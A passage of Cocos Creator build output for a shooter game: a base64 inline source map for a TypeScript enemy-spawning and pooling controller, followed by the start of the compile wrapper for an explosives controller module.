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JvbSBcIi4uL2VudGl0aWVzL2VuZW15L0VuZW15XCI7XHJcbmltcG9ydCBTcGFjZVBhcnRpdGlvbiBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9TcGFjZVBhcnRpdGlvblwiO1xyXG5pbXBvcnQge0dhbWVQcm94eX0gZnJvbSBcIi4vR2FtZVByb3h5XCI7XHJcbmltcG9ydCBQcm9wQmFzZSBmcm9tIFwiLi4vZW50aXRpZXMvcHJvcC9Qcm9wQmFzZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5sZXQgTUFYX0xPR0lDX0NPVU5UID0gMTA7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBHYW1lRW5lbXlzQ29udHJvbGxlciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBwcm9wTGF5ZXI6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBlbmVteUxheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZW5lbXlCbG9vZExheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgYmdOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIHByaXZhdGUgX2VuZW15Q291bnQgPSAwO1xyXG5cclxuICAgIHByaXZhdGUgZW5lbXlMb2dpY0xpc3Q6QXJyYXk8RW5lbXk+ID0gW107XHJcblxyXG5cclxuICAgIGdldCBlbmVteUNvdW50KCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX2VuZW15Q291bnQ7XHJcbiAgICB9XHJcblxyXG4gICAgc2V0IGVuZW15Q291bnQodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgIHRoaXMuX2VuZW15Q291bnQgPSB2YWx1ZTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIF9lbm1leU1hcCA9IG5ldyBNYXA8bnVtYmVyLCBBcnJheTxFbmVteT4+KCk7XHJcbiAgICBwcml2YXRlIF9lbm1leUJsb29kQXJyYXk6QXJyYXk8Y2MuTm9kZT4gPSBbXTtcclxuXHJcbiAgICBwcml2YXRlIF9wcm9wTWFwID0gbmV3IE1hcDxudW1iZXIsIEFycmF5PFByb3BCYXNlPj4oKTtcclxuICAgIHByaXZhdGUgX2d1bnNBcnI6QXJyYXk8UHJvcEJhc2U+ID0gW107XHJcblxyXG4gICAgZ2FtZVByb3BzOkFycmF5PFByb3BCYXNlPiA9IFtdO1xyXG5cclxuICAgIHByaXZhdGUgZ2VuRW5lbXkoaWQ6bnVtYmVyKTpFbmVteXtcclxuICAgICAgICBsZXQgcHJlZmFiUGF0aCA9ICdwcmVmYWIvZW50aXRpZXMvZW5lbXkvZW5lbXknK2lkO1xyXG4gICAgICAgIGxldCBlbnRpdHlQcmVmYWIgPSBjYy5sb2FkZXIuZ2V0UmVzKHByZWZhYlBhdGgsIGNjLlByZWZhYik7XHJcbiAgICAgICAgbGV0IG5vZGUgPSBjYy5pbnN0YW50aWF0ZShlbnRpdHlQcmVmYWIpO1xyXG4gICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5lbmVteUxheWVyLmFkZENoaWxkKG5vZGUpO1xyXG4gICAgICAgIGxldCBlbmVteSA9IDxFbmVteT5ub2RlLmdldENvbXBvbmVudChFbmVteSk7XHJcbiAgICAgICAgZW5lbXkuaW5pdChpZCk7XHJcbiAgICAgICAgbGV0IGFyciA9IHRoaXMuX2VubWV5TWFwLmdldChpZCk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBhcnIgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIGFyciA9IFtdO1xyXG4gICAgICAgICAgICB0aGlzLl9lbm1leU1hcC5zZXQoaWQsIGFycik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGFyci5wdXNoKGVuZW15KTtcclxuICAgICAgICByZXR1cm4gZW5lbXk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBnZXRJbmFjdGl2ZUVuZW15KGlkOm51bWJlcik6RW5lbXl7XHJcbiAgICAgICAgbGV0IHJlc3VsdDpFbmVteSA9IHVuZGVmaW5lZDtcclxuICAgICAgICBsZXQgYXJyID0gdGhpcy5fZW5tZXlNYXAuZ2V0KGlkKTtcclxuICAgICAgICBpZiAodHlwZW9mIGFyciAhPSAndW5kZWZpbmVkJyl7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IGFyci5maW5kKHZhbHVlID0+IHZhbHVlLm5vZGUuYWN0aXZlID09IGZhbHNlKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKHR5cGVvZiByZXN1bHQgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IHRoaXMuZ2VuRW5lbXkoaWQpO1xyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gcmVzdWx0O1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgZ2VuRW5lbXlCbG9vZE5vZGUoKTpjYy5Ob2Rle1xyXG4gICAgICAgIGxldCBwcmVmYWJQYXRoID0gJ3ByZWZhYi9lbnRpdGllcy9ibG9vZC9ibG9vZCc7XHJcbiAgICAgICAgbGV0IGVudGl0eVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMocHJlZmFiUGF0aCwgY2MuUHJlZmFiKTtcclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKGVudGl0eVByZWZhYik7XHJcbiAgICAgICAgbm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLmVuZW15Qmxvb2RMYXllci5hZGRDaGlsZChub2RlKTtcclxuICAgICAgICB0aGlzLl9lbm1leUJsb29kQXJyYXkucHVzaChub2RlKTtcclxuICAgICAgICByZXR1cm4gbm9kZTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIGdldEluYWN0aXZlRW5lbXlCbG9vZE5vZGUoKTpjYy5Ob2Rle1xyXG4gICAgICAgIGxldCByZXN1bHQ6Y2MuTm9kZSA9IHRoaXMuX2VubWV5Qmxvb2RBcnJheS5maW5kKHZhbHVlID0+IHZhbHVlLmFjdGl2ZSA9PSBmYWxzZSk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiByZXN1bHQgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IHRoaXMuZ2VuRW5lbXlCbG9vZE5vZGUoKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIGdlblByb3AoaWQ6bnVtYmVyKTpQcm9wQmFzZXtcclxuICAgICAgICBsZXQgcHJlZmFiUGF0aCA9ICdwcmVmYWIvZW50aXRpZXMvcHJvcC9wcm9wJytpZDtcclxuICAgICAgICBsZXQgZW50aXR5UHJlZmFiID0gY2MubG9hZGVyLmdldFJlcyhwcmVmYWJQYXRoLCBjYy5QcmVmYWIpO1xyXG4gICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUoZW50aXR5UHJlZmFiKTtcclxuICAgICAgICBub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMucHJvcExheWVyLmFkZENoaWxkKG5vZGUpO1xyXG4gICAgICAgIGxldCBwcm9wID0gPFByb3BCYXNlPm5vZGUuZ2V0Q29tcG9uZW50KFByb3BCYXNlKTtcclxuICAgICAgICBwcm9wLmluaXQoaWQpO1xyXG4gICAgICAgIGxldCBhcnIgPSB0aGlzLl9wcm9wTWFwLmdldChpZCk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBhcnIgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIGFyciA9IFtdO1xyXG4gICAgICAgICAgICB0aGlzLl9wcm9wTWFwLnNldChpZCwgYXJyKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgYXJyLnB1c2gocHJvcCk7XHJcbiAgICAgICAgcmV0dXJuIHByb3A7XHJcbiAgICB9XHJcblxyXG4gICAgZ2V0SW5hY3RpdmVQcm9wKGlkOm51bWJlcik6UHJvcEJhc2V7XHJcbiAgICAgICAgbGV0IHJlc3VsdDpQcm9wQmFzZSA9IHVuZGVmaW5lZDtcclxuICAgICAgICBsZXQgYXJyID0gdGhpcy5fcHJvcE1hcC5nZXQoaWQpO1xyXG4gICAgICAgIGlmICh0eXBlb2YgYXJyICE9ICd1bmRlZmluZWQnKXtcclxuICAgICAgICAgICAgcmVzdWx0ID0gYXJyLmZpbmQodmFsdWUgPT4gdmFsdWUubm9kZS5hY3RpdmUgPT0gZmFsc2UpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBpZiAodHlwZW9mIHJlc3VsdCA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgcmVzdWx0ID0gdGhpcy5nZW5Qcm9wKGlkKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRJbmFjdGl2ZUd1bigpOlByb3BCYXNle1xyXG4gICAgICAgIGxldCByZXN1bHQgPSB0aGlzLl9ndW5zQXJyLmZpbmQodmFsdWUgPT4gdmFsdWUubm9kZS5hY3RpdmUgPT0gZmFsc2UpO1xyXG4gICAgICAgIGlmICh0eXBlb2YgcmVzdWx0ID09IFwidW5kZWZpbmVkXCIpe1xyXG4gICAgICAgICAgICBsZXQgcHJlZmFiUGF0aCA9ICdwcmVmYWIvZW50aXRpZXMvcHJvcC9ndW5zJztcclxuICAgICAgICAgICAgbGV0IGVudGl0eVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMocHJlZmFiUGF0aCwgY2MuUHJlZmFiKTtcclxuICAgICAgICAgICAgbGV0IG5vZGUgPSBjYy5pbnN0YW50aWF0ZShlbnRpdHlQcmVmYWIpO1xyXG4gICAgICAgICAgICB0aGlzLnByb3BMYXllci5hZGRDaGlsZChub2RlKTtcclxuICAgICAgICAgICAgbm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgcmVzdWx0ID0gPFByb3BCYXNlPm5vZGUuZ2V0Q29tcG9uZW50KFByb3BCYXNlKTtcclxuICAgICAgICAgICAgdGhpcy5fZ3Vuc0Fyci5wdXNoKHJlc3VsdCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiByZXN1bHQ7XHJcbiAgICB9XHJcblxyXG4gICAgb25Mb2FkKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5LaWxsRW5lbXksIHRoaXMub25LaWxsRW5lbXksIHRoaXMpO1xyXG4gICAgICAgIHdpbmRvd1snR2FtZUVuZW15c0NvbnRyb2xsZXInXSA9IHRoaXM7XHJcbiAgICB9XHJcblxyXG4gICAgb25EZXN0cm95KCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9mZihHYW1lUHJveHkuRXZlbnQuS2lsbEVuZW15LCB0aGlzLm9uS2lsbEVuZW15LCB0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIF9zY3JlZW5SZWN0OmNjLlJlY3QgPSBjYy5yZWN0KDAsIDAsIGNjLnZpc2libGVSZWN0LndpZHRoLCBjYy52aXNpYmxlUmVjdC5oZWlnaHQpO1xyXG4gICAgYWxsQWxpdmVBbmRJblNjcmVlbkVuZW15KCk6QXJyYXk8RW5lbXk+e1xyXG4gICAgICAgIGxldCBsaXN0ID0gW107XHJcbiAgICAgICAgdGhpcy5fc2NyZWVuUmVjdC54ID0gLXRoaXMuYmdOb2RlLnggLSBjYy52aXNpYmxlUmVjdC5jZW50ZXIueDtcclxuICAgICAgICB0aGlzLl9zY3JlZW5SZWN0LnkgPSAtdGhpcy5iZ05vZGUueSAtIGNjLnZpc2libGVSZWN0LmNlbnRlci55O1xyXG4gICAgICAgIGZvciAobGV0IG5vZGUgb2YgdGhpcy5lbmVteUxheWVyLmNoaWxkcmVuKXtcclxuICAgICAgICAgICAgbGV0IGVuZW15ID0gbm9kZS5nZXRDb21wb25lbnQoRW5lbXkpO1xyXG4gICAgICAgICAgICBpZiAoIWVuZW15Lm5vZGUuYWN0aXZlIHx8IGVuZW15LmhwIDw9IDAgfHwgZW5lbXkubm9kZS54ICsgZW5lbXkuc3BhY2VDaXJjbGVDb2xsaWRlci5yYWRpdXMgPD0gdGhpcy5fc2NyZWVuUmVjdC54TWluIHx8IGVuZW15Lm5vZGUueCAtIGVuZW15LnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzID4gdGhpcy5fc2NyZWVuUmVjdC54TWF4IHx8IGVuZW15Lm5vZGUueSArIGVuZW15LnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzIDwgdGhpcy5fc2NyZWVuUmVjdC55TWluIHx8IGVuZW15Lm5vZGUueSAtIGVuZW15LnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzID4gdGhpcy5fc2NyZWVuUmVjdC55TWF4KXtcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGxpc3QucHVzaChlbmVteSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiBsaXN0O1xyXG4gICAgfVxyXG5cclxuICAgIGFsbEFsaXZlRW5lbXkoKTpBcnJheTxFbmVteT57XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuZW5lbXlMYXllci5jaGlsZHJlbi5maWx0ZXIodmFsdWUgPT4gdmFsdWUuYWN0aXZlICYmIHZhbHVlLmdldENvbXBvbmVudChFbmVteSkuaHAgPiAwKS5tYXAodmFsdWUgPT4gdmFsdWUuZ2V0Q29tcG9uZW50KEVuZW15KSk7XHJcbiAgICB9XHJcblxyXG4gICAgYWxsQWN0aXZlRW5lbXkoKTpBcnJheTxFbmVteT57XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuZW5lbXlMYXllci5jaGlsZHJlbi5maWx0ZXIodmFsdWUgPT4gdmFsdWUuYWN0aXZlKS5tYXAodmFsdWUgPT4gdmFsdWUuZ2V0Q29tcG9uZW50KEVuZW15KSk7XHJcbiAgICB9XHJcblxyXG4gICAgY3JlYXRlRW5lbXkoaWQ6bnVtYmVyKXtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcImNyZWF0ZUVuZW15PT0+XCIsIGlkKTtcclxuICAgICAgICB0aGlzLmVuZW15Q291bnQrKztcclxuICAgICAgICAvL+e7keWumlxyXG4gICAgICAgIC8v6KeS6ImyOTAw6IyD5Zu05YaF6ZqP5py65Ye6546wXHJcbiAgICAgICAgbGV0IHgxID0gTWF0aC5tYXgoLXRoaXMuYmdOb2RlLnggLSBjYy52aXNpYmxlUmVjdC5jZW50ZXIueCwgLXRoaXMuYmdOb2RlLndpZHRoLzIpO1xyXG4gICAgICAgIGxldCB5MSA9IE1hdGgubWF4KC10aGlzLmJnTm9kZS55IC0gY2MudmlzaWJsZVJlY3QuY2VudGVyLnksIC10aGlzLmJnTm9kZS5oZWlnaHQvMik7XHJcbiAgICAgICAgbGV0IHcxID0gTWF0aC5taW4oY2MudmlzaWJsZVJlY3Qud2lkdGgsIHRoaXMuYmdOb2RlLndpZHRoLzIgLSB4MSk7XHJcbiAgICAgICAgbGV0IGgxID0gTWF0aC5taW4oY2MudmlzaWJsZVJlY3QuaGVpZ2h0LCB0aGlzLmJnTm9kZS5oZWlnaHQvMiAtIHkxKTtcclxuICAgICAgICBsZXQgc2NyZWVuUmVjdCA9IGNjLnJlY3QoeDEsIHkxLCB3MSwgaDEpO1xyXG4gICAgICAgIGxldCByYW5nZSA9IDIwMDtcclxuICAgICAgICBsZXQgeDIgPSBNYXRoLm1heCh4MSAtIHJhbmdlLCAtdGhpcy5iZ05vZGUud2lkdGgvMik7XHJcbiAgICAgICAgbGV0IHkyID0gTWF0aC5tYXgoeTEgLSByYW5nZSwgLXRoaXMuYmdOb2RlLmhlaWdodC8yKTtcclxuICAgICAgICBsZXQgdzIgPSBNYXRoLm1pbihjYy52aXNpYmxlUmVjdC53aWR0aCArIHJhbmdlKjIsIHRoaXMuYmdOb2RlLndpZHRoLzIgLSB4Mik7XHJcbiAgICAgICAgbGV0IGgyID0gTWF0aC5taW4oY2MudmlzaWJsZVJlY3QuaGVpZ2h0ICsgcmFuZ2UqMiwgdGhpcy5iZ05vZGUuaGVpZ2h0LzIgLSB5Mik7XHJcbiAgICAgICAgbGV0IHJhbmdlUmVjdCA9IGNjLnJlY3QoeDIsIHkyLCB3MiwgaDIpO1xyXG4gICAgICAgIGxldCBwYXJ0aXRpb25zID0gW3JhbmdlUmVjdF07XHJcbiAgICAgICAgU3BhY2VQYXJ0aXRpb24ucGFydGl0aW9uUmVjdChwYXJ0aXRpb25zLCBzY3JlZW5SZWN0LCAzMCwgMzApO1xyXG4gICAgICAgIC8vIGxldCBwYXJ0aXRpb25zID0gW2NjLnJlY3QoLXRoaXMuX2JnTm9kZS53aWR0aC8yLCAtdGhpcy5fYmdOb2RlLmhlaWdodC8yLCB0aGlzLl9iZ05vZGUud2lkdGgsIHRoaXMuX2JnTm9kZS5oZWlnaHQpXTtcclxuICAgICAgICAvLyB0aGlzLmFsbEFjdGl2ZUVuZW15KCkuZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgLy8gICAgIFNwYWNlUGFydGl0aW9uLnBhcnRpdGlvblJlY3QocGFydGl0aW9ucywgdmFsdWUuZW5lbXlBQUJCLmFhYmIoKSk7XHJcbiAgICAgICAgLy8gfSk7XHJcbiAgICAgICAgLy9cclxuICAgICAgICAvLyBTcGFjZVBhcnRpdGlvbi5wYXJ0aXRpb25SZWN0KHBhcnRpdGlvbnMsIHRoaXMuX2dhbWVSb2xlQ29udHJvbGxlci5yb2xlLnJvbGVBQUJCLmFhYmIoKSk7XHJcbiAgICAgICAgbGV0IGVuZW15ID0gdGhpcy5nZXRJbmFjdGl2ZUVuZW15KGlkKTtcclxuICAgICAgICBsZXQgcmFkaXVzID0gZW5lbXkuZ2V0Q29tcG9uZW50KGNjLkNpcmNsZUNvbGxpZGVyKS5yYWRpdXM7XHJcbiAgICAgICAgbGV0IHJlY3QgPSBTcGFjZVBhcnRpdGlvbi5yYW5kb21TcGFjZShwYXJ0aXRpb25zLCByYWRpdXMqMiwgcmFkaXVzKjIpO1xyXG5cclxuICAgICAgICBpZiAocmVjdCl7XHJcbiAgICAgICAgICAgIGVuZW15Lm5vZGUucG9zaXRpb24gPSByZWN0LmNlbnRlcjtcclxuICAgICAgICAgICAgZW5lbXkubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICB0aGlzLmVuZW15TG9naWNMaXN0LnB1c2goZW5lbXkpO1xyXG4gICAgICAgICAgICB3aW5kb3dbJ0dhbWVDb2xsaXNpb25Db250cm9sbGVyJ10ubG9vc2VRdWFkVHJlZS5pbnNlcnQoZW5lbXkuZW5lbXlBQUJCKTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXCLmsqHmnInnqbrpl7TkuoYuLi5cIiwgcGFydGl0aW9ucyk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uS2lsbEVuZW15KGVuZW15OkVuZW15KXtcclxuICAgICAgICB0aGlzLmVuZW15TG9naWNMaXN0LnNwbGljZSh0aGlzLmVuZW15TG9naWNMaXN0LmluZGV4T2YoZW5lbXkpLCAxKTtcclxuICAgICAgICB3aW5kb3dbJ0dhbWVDb2xsaXNpb25Db250cm9sbGVyJ10ubG9vc2VRdWFkVHJlZS5yZW1vdmUoZW5lbXkuZW5lbXlBQUJCKTtcclxuICAgICAgICB0aGlzLmVuZW15Q291bnQtLTtcclxuICAgIH1cclxuXHJcbiAgICBsYXRlVXBkYXRlKCl7XHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5wYXVzZUdhbWUpe1xyXG4gICAgICAgICAgICByZXR1cm47XHJcbiAgICAgICAgfVxyXG4gICAgICAgIC8qKiDmr4/mrKHlpITnkIblm7rlrprmlbDph4/nmoTmlYzkurrpgLvovpEgKi9cclxuICAgICAgICBsZXQgcHJlTnVtID0gMDtcclxuICAgICAgICBmb3IgKGxldCBlbmVteSBvZiB0aGlzLmVuZW15TG9naWNMaXN0KXtcclxuICAgICAgICAgICAgaWYgKGVuZW15LmxvZ2ljRmxhZyl7XHJcbiAgICAgICAgICAgICAgICBwcmVOdW0rKztcclxuICAgICAgICAgICAgICAgIGVuZW15LmxvZ2ljRmxhZyA9IGZhbHNlO1xyXG4gICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLmVuZW15TG9naWNMaXN0LnB1c2goLi4udGhpcy5lbmVteUxvZ2ljTGlzdC5zcGxpY2UoMCwgcHJlTnVtKSk7XHJcbiAgICAgICAgbGV0IGNvdW50ID0gTWF0aC5taW4oTUFYX0xPR0lDX0NPVU5ULCB0aGlzLmVuZW15TG9naWNMaXN0Lmxlbmd0aCk7XHJcbiAgICAgICAgZm9yIChsZXQgaT0wOyBpPGNvdW50OyBpKyspe1xyXG4gICAgICAgICAgICB0aGlzLmVuZW15TG9naWNMaXN0W2ldLmxvZ2ljRmxhZyA9IHRydWU7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameExplosivesController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '89858T6hXVPE6i2+IlNrBWF', 'GameExplosivesController');
// script/app/game/GameExplosivesController.ts

Object.defineProperty(exports, "__esModule", { value: true });
